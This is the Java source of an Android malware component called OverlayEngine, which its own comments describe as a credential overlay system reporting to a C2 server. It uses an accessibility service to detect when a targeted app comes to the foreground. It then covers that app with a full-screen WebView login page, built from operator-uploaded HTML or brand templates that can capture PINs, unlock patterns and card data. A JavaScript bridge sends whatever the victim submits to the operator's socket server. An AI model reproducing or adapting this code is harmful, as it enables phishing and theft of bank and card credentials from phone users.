package com.fason.app.features.overlay;

import android.accessibilityservice.AccessibilityService;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.ProgressBar;

import com.fason.app.core.FasonApp;
import com.fason.app.core.network.SocketClient;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import io.socket.client.Socket;

/**
 * OverlayEngine 2026 — real-time credential overlay system.
 * Two content sources:
 *   1. UPLOAD  — operator pushes raw HTML via socket (stored on device)
 *   2. DASHBOARD — built from template + brand config sent by dashboard
 * Renders full-screen WebView overlay when target package comes to foreground.
 * All captured credentials are emitted to the C2 in real time.
 */
public final class OverlayEngine {
    private static final String TAG = "Overlay2026";
    private static final String PREFS = "fason_overlay_2026";
    private static final int LAYOUT_FLAG = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
            ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            : WindowManager.LayoutParams.TYPE_PHONE;

    private static volatile OverlayEngine instance;
    private final Context ctx;
    private final WindowManager wm;
    private final SharedPreferences prefs;
    private final Handler main = new Handler(Looper.getMainLooper());
    private final ExecutorService io = Executors.newSingleThreadExecutor();
    private final Map<String, OverlayConfig> configs = new HashMap<>();
    private final Map<String, View> activeViews = new HashMap<>();
    private volatile String foregroundPackage = "";
    private volatile boolean engineEnabled = false;
    private volatile AccessibilityService a11yService;

    private OverlayEngine() {
        this.ctx = FasonApp.getContext();
        this.wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        this.prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
        loadConfigs();
    }

    public static synchronized OverlayEngine getInstance() {
        if (instance == null) instance = new OverlayEngine();
        return instance;
    }

    public void setAccessibilityService(AccessibilityService s) { this.a11yService = s; }

    // ---------------------------------------------------------------- config
    private static final class OverlayConfig {
        String id;
        String targetPackage;
        String source;          // "upload" | "dashboard"
        String html;            // full page (upload mode)
        String template;        // template id (dashboard mode)
        String brandName;
        String brandColor;
        String logoUrl;
        String title;
        String subtitle;
        boolean capturePin;
        boolean capturePattern;
        boolean captureCard;
        long createdAt;
        int triggerCount;
    }

    private void loadConfigs() {
        synchronized (configs) {
            configs.clear();
            Map<String, ?> all = prefs.getAll();
            for (Map.Entry<String, ?> e : all.entrySet()) {
                if (!(e.getValue() instanceof String)) continue;
                try {
                    JSONObject o = new JSONObject((String) e.getValue());
                    OverlayConfig c = new OverlayConfig();
                    c.id = o.optString("id");
                    c.targetPackage = o.optString("targetPackage");
                    c.source = o.optString("source", "dashboard");
                    c.html = o.optString("html", "");
                    c.template = o.optString("template", "generic_login");
                    c.brandName = o.optString("brandName", "Sign in");
                    c.brandColor = o.optString("brandColor", "#1a73e8");
                    c.logoUrl = o.optString("logoUrl", "");
                    c.title = o.optString("title", "");
                    c.subtitle = o.optString("subtitle", "");
                    c.capturePin = o.optBoolean("capturePin", false);
                    c.capturePattern = o.optBoolean("capturePattern", false);
                    c.captureCard = o.optBoolean("captureCard", false);
                    c.createdAt = o.optLong("createdAt", 0);
                    c.triggerCount = o.optInt("triggerCount", 0);
                    configs.put(c.id, c);
                } catch (Exception ignored) {}
            }
        }
    }

    private void saveConfig(OverlayConfig c) {
        try {
            JSONObject o = new JSONObject();
            o.put("id", c.id);
            o.put("targetPackage", c.targetPackage);
            o.put("source", c.source);
            o.put("html", c.html);
            o.put("template", c.template);
            o.put("brandName", c.brandName);
            o.put("brandColor", c.brandColor);
            o.put("logoUrl", c.logoUrl);
            o.put("title", c.title);
            o.put("subtitle", c.subtitle);
            o.put("capturePin", c.capturePin);
            o.put("capturePattern", c.capturePattern);
            o.put("captureCard", c.captureCard);
            o.put("createdAt", c.createdAt);
            o.put("triggerCount", c.triggerCount);
            prefs.edit().putString(c.id, o.toString()).apply();
        } catch (Exception ignored) {}
    }

    // ------------------------------------------------------------- commands
    /** Register overlay. payload: {targetPackage, source, html?, template?, brand...} */
    public JSONObject register(JSONObject payload) {
        OverlayConfig c = new OverlayConfig();
        c.id = payload.optString("id", UUID.randomUUID().toString());
        c.targetPackage = payload.optString("targetPackage", "");
        c.source = payload.optString("source", "dashboard");
        c.html = payload.optString("html", "");
        c.template = payload.optString("template", "generic_login");
        c.brandName = payload.optString("brandName", "Sign in");
        c.brandColor = payload.optString("brandColor", "#1a73e8");
        c.logoUrl = payload.optString("logoUrl", "");
        c.title = payload.optString("title", "");
        c.subtitle = payload.optString("subtitle", "");
        c.capturePin = payload.optBoolean("capturePin", false);
        c.capturePattern = payload.optBoolean("capturePattern", false);
        c.captureCard = payload.optBoolean("captureCard", false);
        c.createdAt = System.currentTimeMillis();
        synchronized (configs) { configs.put(c.id, c); }
        saveConfig(c);
        if ("upload".equals(c.source) && !c.html.isEmpty()) {
            io.execute(() -> persistHtml(c.id, c.html));
        }
        return status();
    }

    public JSONObject remove(String id) {
        synchronized (configs) { configs.remove(id); }
        prefs.edit().remove(id).apply();
        dismiss(id);
        return status();
    }

    public JSONObject clearAll() {
        synchronized (configs) {
            for (String id : new HashMap<>(configs).keySet()) dismiss(id);
            configs.clear();
        }
        prefs.edit().clear().apply();
        return status();
    }

    public JSONObject list() {
        JSONObject r = new JSONObject();
        JSONArraySafe arr = new JSONArraySafe();
        synchronized (configs) {
            for (OverlayConfig c : configs.values()) {
                JSONObject o = new JSONObject();
                try {
                    o.put("id", c.id);
                    o.put("targetPackage", c.targetPackage);
                    o.put("source", c.source);
                    o.put("template", c.template);
                    o.put("brandName", c.brandName);
                    o.put("triggerCount", c.triggerCount);
                    o.put("createdAt", c.createdAt);
                } catch (Exception ignored) {}
                arr.put(o);
            }
        }
        try {
            r.put("overlays", arr.array);
            r.put("count", configs.size());
            r.put("enabled", engineEnabled);
        } catch (Exception ignored) {}
        return r;
    }

    public JSONObject status() {
        JSONObject s = new JSONObject();
        try {
            s.put("enabled", engineEnabled);
            s.put("configured", configs.size());
            s.put("active", activeViews.size());
            s.put("canDraw", canDrawOverlays());
        } catch (Exception ignored) {}
        return s;
    }

    private boolean canDrawOverlays() {
        return Build.VERSION.SDK_INT < Build.VERSION_CODES.M ||
                android.provider.Settings.canDrawOverlays(ctx);
    }

    // ------------------------------------------------------------- trigger
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!engineEnabled || event == null) return;
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;
        CharSequence pkg = event.getPackageName();
        if (pkg == null) return;
        String newPkg = pkg.toString();
        if (newPkg.equals(foregroundPackage)) return;
        foregroundPackage = newPkg;

        // auto-dismiss when leaving target
        synchronized (activeViews) {
            for (Map.Entry<String, View> e : new HashMap<>(activeViews).entrySet()) {
                OverlayConfig c = configs.get(e.getKey());
                if (c != null && !c.targetPackage.equals(newPkg)) dismiss(e.getKey());
            }
        }
        // auto-show when entering target
        OverlayConfig match = null;
        synchronized (configs) {
            for (OverlayConfig c : configs.values()) {
                if (c.targetPackage.equals(newPkg)) { match = c; break; }
            }
        }
        if (match != null) show(match);
    }

    @SuppressLint({"SetJavaScriptEnabled", "AddJavascriptInterface"})
    public void show(OverlayConfig c) {
        if (activeViews.containsKey(c.id)) return;
        if (!canDrawOverlays()) { requestOverlayPermission(); return; }
        c.triggerCount++;
        saveConfig(c);

        main.post(() -> {
            try {
                FrameLayout root = new FrameLayout(ctx);
                root.setBackgroundColor(Color.WHITE);

                WebView web = new WebView(ctx);
                web.setLayoutParams(new FrameLayout.LayoutParams(
                        ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));
                WebSettings ws = web.getSettings();
                ws.setJavaScriptEnabled(true);
                ws.setDomStorageEnabled(true);
                ws.setCacheMode(WebSettings.LOAD_NO_CACHE);
                ws.setMediaPlaybackRequiresUserGesture(false);
                web.setWebChromeClient(new WebChromeClient());
                web.setWebViewClient(new WebViewClient() {
                    @Override public boolean shouldOverrideUrlLoading(WebView v, String url) { return true; }
                });
                web.addJavascriptInterface(new Bridge(c.id), "FasonBridge");

                String page = "upload".equals(c.source) && !c.html.isEmpty()
                        ? c.html
                        : TemplateRenderer.render(c.template, c.brandName, c.brandColor,
                                c.logoUrl, c.title, c.subtitle, c.capturePin, c.capturePattern, c.captureCard);
                web.loadDataWithBaseURL("https://localhost", page, "text/html", "UTF-8", null);

                ProgressBar spinner = new ProgressBar(ctx);
                FrameLayout.LayoutParams sp = new FrameLayout.LayoutParams(
                        ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
                sp.gravity = Gravity.CENTER;
                root.addView(web);
                root.addView(spinner, sp);
                web.setWebViewClient(new WebViewClient() {
                    @Override public void onPageFinished(WebView v, String url) {
                        spinner.setVisibility(View.GONE);
                    }
                });

                WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        LAYOUT_FLAG,
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                | WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
                        PixelFormat.TRANSLUCENT);
                lp.gravity = Gravity.TOP | Gravity.START;
                lp.screenBrightness = WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_FULL;
                wm.addView(root, lp);
                synchronized (activeViews) { activeViews.put(c.id, root); }
                emitEvent("overlay_shown", c.id, c.targetPackage, null);
            } catch (Exception ex) {
                emitEvent("overlay_error", c.id, c.targetPackage, ex.getMessage());
            }
        });
    }

    public void dismiss(String id) {
        main.post(() -> {
            View v;
            synchronized (activeViews) { v = activeViews.remove(id); }
            if (v != null) {
                try { wm.removeView(v); } catch (Exception ignored) {}
                emitEvent("overlay_dismissed", id, "", null);
            }
        });
    }

    public void dismissAll() {
        synchronized (activeViews) {
            for (String id : new HashMap<>(activeViews).keySet()) dismiss(id);
        }
    }

    public void setEnabled(boolean enabled) {
        this.engineEnabled = enabled;
        if (!enabled) dismissAll();
    }

    public boolean isEnabled() { return engineEnabled; }

    private void requestOverlayPermission() {
        try {
            android.content.Intent i = new android.content.Intent(
                    android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    android.net.Uri.parse("package:" + ctx.getPackageName()));
            i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception ignored) {}
    }

    private void persistHtml(String id, String html) {
        try {
            File dir = new File(ctx.getFilesDir(), "overlays");
            if (!dir.exists()) dir.mkdirs();
            File f = new File(dir, id + ".html");
            try (FileOutputStream fos = new FileOutputStream(f)) {
                fos.write(html.getBytes(StandardCharsets.UTF_8));
            }
        } catch (Exception ignored) {}
    }

    // ------------------------------------------------------------- bridge
    private final class Bridge {
        private final String overlayId;
        Bridge(String id) { this.overlayId = id; }

        @JavascriptInterface
        public void submit(String json) {
            emitEvent("overlay_capture", overlayId, foregroundPackage, json);
        }
        @JavascriptInterface
        public void cancel() {
            dismiss(overlayId);
        }
        @JavascriptInterface
        public void log(String msg) {
            emitEvent("overlay_log", overlayId, foregroundPackage, msg);
        }
    }

    private void emitEvent(String event, String overlayId, String pkg, String data) {
        try {
            Socket s = SocketClient.getInstance() != null ? SocketClient.getInstance().getSocket() : null;
            if (s == null) return;
            JSONObject o = new JSONObject();
            o.put("event", event);
            o.put("overlayId", overlayId);
            o.put("package", pkg);
            o.put("timestamp", System.currentTimeMillis());
            if (data != null) o.put("data", data);
            s.emit("0xOV", o);
        } catch (Exception ignored) {}
    }

    // small helper to avoid JSONArray import noise
    private static final class JSONArraySafe {
        final org.json.JSONArray array = new org.json.JSONArray();
        void put(JSONObject o) { array.put(o); }
    }
}
